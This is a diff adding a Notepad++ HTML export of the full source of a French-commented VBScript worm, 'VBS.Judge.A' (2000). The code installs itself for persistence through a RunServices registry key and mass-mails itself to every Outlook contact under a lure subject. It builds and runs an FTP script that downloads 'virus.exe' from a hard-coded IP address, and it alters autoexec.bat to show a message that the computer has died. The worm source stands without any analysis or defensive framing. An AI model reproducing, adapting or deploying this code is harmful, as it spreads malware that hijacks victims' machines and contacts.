@@ -1,0 +1,128 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
+<html>
+<head>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252">
+<title>Exported from Notepad++</title>
+<style type="text/css">
+span {
+	font-family: 'Courier New';
+	font-size: 10pt;
+	color: #000000;
+}
+.sc0 {
+}
+.sc1 {
+	color: #008000;
+}
+.sc2 {
+	font-weight: bold;
+	color: #FF0000;
+}
+.sc3 {
+	color: #0000FF;
+}
+.sc4 {
+	color: #808080;
+}
+.sc6 {
+	font-weight: bold;
+}
+.sc7 {
+}
+</style>
+</head>
+<body>
+<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">'VBS.Judge.A par Petik (c)2000
+</span><span class="sc0">
+</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc6">,</span><span class="sc7">ws</span><span class="sc6">,</span><span class="sc7">file</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">fso</span><span class="sc0">  </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ws</span><span class="sc0">   </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"WScript.Shell"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">file</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.OpenTextFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullname</span><span class="sc6">,</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">vbs</span><span class="sc0">      </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">file.ReadAll</span><span class="sc0">
+
+</span><span class="sc7">DEBUT</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">DEBUT</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">win</span><span class="sc0">  </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetSpecialFolder</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">c</span><span class="sc0">    </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.GetFile</span><span class="sc6">(</span><span class="sc7">WScript.ScriptFullName</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">c.Copy</span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\WinGDI.EXE.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">c.Copy</span><span class="sc6">(</span><span class="sc4">"C:\Judge.TXT.vbs"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ws.RegWrite</span><span class="sc0"> </span><span class="sc4">"HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\WinGDI"</span><span class="sc6">,</span><span class="sc7">win&amp;</span><span class="sc4">"\WinGDI.EXE.vbs"</span><span class="sc0">
+</span><span class="sc7">EMAIL</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">FTP</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">AUTOEXEC</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc7">TXT</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">EMAIL</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc7">fso.FileExists</span><span class="sc6">(</span><span class="sc4">"C:\Judge.txt"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">OApp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Outlook.Application"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">oapp</span><span class="sc6">=</span><span class="sc4">"Outlook"</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Mapi</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OApp.GetNameSpace</span><span class="sc6">(</span><span class="sc4">"MAPI"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">AddList</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">Mapi.AddressLists</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">AddList.AddressEntries.Count</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">AddListCount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc7">AddList.AddressEntries.Count</span><span class="sc0"> 
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">AddListEntry</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">AddList.AddressEntries</span><span class="sc6">(</span><span class="sc7">AddListCount</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">msg</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">OApp.CreateItem</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">msg.To</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">AddListEntry.Address</span><span class="sc0">
+</span><span class="sc7">msg.Subject</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"BatMan, SpiderMan et les autres"</span><span class="sc0">
+</span><span class="sc7">msg.Body</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"La vraie histoire de ces justiciers"</span><span class="sc0">
+</span><span class="sc7">msg.Attachments.Add</span><span class="sc0"> </span><span class="sc4">"C:\Judge.TXT.vbs"</span><span class="sc0">
+</span><span class="sc7">msg.DeleteAfterSubmit</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">msg.To</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc7">msg.Send</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">Next</span><span class="sc0">
+</span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">FTP</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc3">Not</span><span class="sc0"> </span><span class="sc7">fso.FileExists</span><span class="sc6">(</span><span class="sc4">"C:\Judge.txt"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">bat</span><span class="sc0">  </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.CreateTextFile</span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\FTP.bat"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">bat.WriteLine</span><span class="sc0"> </span><span class="sc4">"@echo off"</span><span class="sc0">
+</span><span class="sc7">bat.WriteLine</span><span class="sc0"> </span><span class="sc4">"start ftp -i -v -s:C:\FTP.drv"</span><span class="sc0">
+</span><span class="sc7">bat.close</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">drv</span><span class="sc0">  </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.CreateTextFile</span><span class="sc6">(</span><span class="sc4">"C:\FTP.drv"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">drv.WriteLine</span><span class="sc0"> </span><span class="sc4">"open"</span><span class="sc0">
+</span><span class="sc7">drv.WriteLine</span><span class="sc0"> </span><span class="sc4">"205.188.137.185"</span><span class="sc0">
+</span><span class="sc7">drv.WriteLine</span><span class="sc0"> </span><span class="sc4">"pentasm99"</span><span class="sc0">
+</span><span class="sc7">drv.WriteLine</span><span class="sc0"> </span><span class="sc4">"binary"</span><span class="sc0">
+</span><span class="sc7">drv.WriteLine</span><span class="sc0"> </span><span class="sc4">"lcd C:\"</span><span class="sc0">
+</span><span class="sc7">drv.WriteLine</span><span class="sc0"> </span><span class="sc4">"get virus.exe"</span><span class="sc0">
+</span><span class="sc7">drv.WriteLine</span><span class="sc0"> </span><span class="sc4">"bye"</span><span class="sc0">
+</span><span class="sc7">drv.WriteLine</span><span class="sc0"> </span><span class="sc4">"exit"</span><span class="sc0">
+</span><span class="sc7">drv.close</span><span class="sc0">
+</span><span class="sc7">ws.Run</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">win&amp;</span><span class="sc4">"\FTP.bat"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">AUTOEXEC</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Day</span><span class="sc6">(</span><span class="sc7">Now</span><span class="sc6">())</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">FileObj</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CreateObject</span><span class="sc6">(</span><span class="sc4">"Scripting.FileSystemObject"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">file</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"c:\autoexec.bat"</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">InStream</span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FileObj.OpenTextFile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">file</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">TLine</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Instream.Readall</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">autobat</span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FileObj.CreateTextFile</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">file</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">autobat.write</span><span class="sc6">(</span><span class="sc7">tline</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">autobat.WriteBlankLines</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">autobat.WriteLine</span><span class="sc0"> </span><span class="sc4">"@echo off"</span><span class="sc0">
+</span><span class="sc7">autobat.WriteLine</span><span class="sc0"> </span><span class="sc4">"cls"</span><span class="sc0">
+</span><span class="sc7">autobat.WriteLine</span><span class="sc0"> </span><span class="sc4">"echo."</span><span class="sc0">
+</span><span class="sc7">autobat.WriteLine</span><span class="sc0"> </span><span class="sc4">"echo."</span><span class="sc0">
+</span><span class="sc7">autobat.WriteLine</span><span class="sc0"> </span><span class="sc4">"echo VBS.Judge.A par PetiK (c)2000"</span><span class="sc0">
+</span><span class="sc7">autobat.WriteLine</span><span class="sc0"> </span><span class="sc4">"echo."</span><span class="sc0">
+</span><span class="sc7">autobat.WriteLine</span><span class="sc0"> </span><span class="sc4">"echo TON ORDINATEUR VIENT DE MOURIR"</span><span class="sc0">
+</span><span class="sc7">autobat.WriteLine</span><span class="sc0"> </span><span class="sc4">"pause"</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+
+</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">TXT</span><span class="sc6">()</span><span class="sc0">
+</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">ptk</span><span class="sc0">  </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">fso.CreateTextFile</span><span class="sc6">(</span><span class="sc4">"C:\Judge.txt"</span><span class="sc6">)</span><span class="sc0">
+</span><span class="sc7">ptk.WriteLine</span><span class="sc0"> </span><span class="sc4">"Si vous lisez ce texte,"</span><span class="sc0">
+</span><span class="sc7">ptk.WriteLine</span><span class="sc0"> </span><span class="sc4">"c'est que vous avez eu le Ver VBS.Judge.A"</span><span class="sc0">
+</span><span class="sc7">ptk.Close</span><span class="sc0">
+</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
+</span></div></body>
+</html>
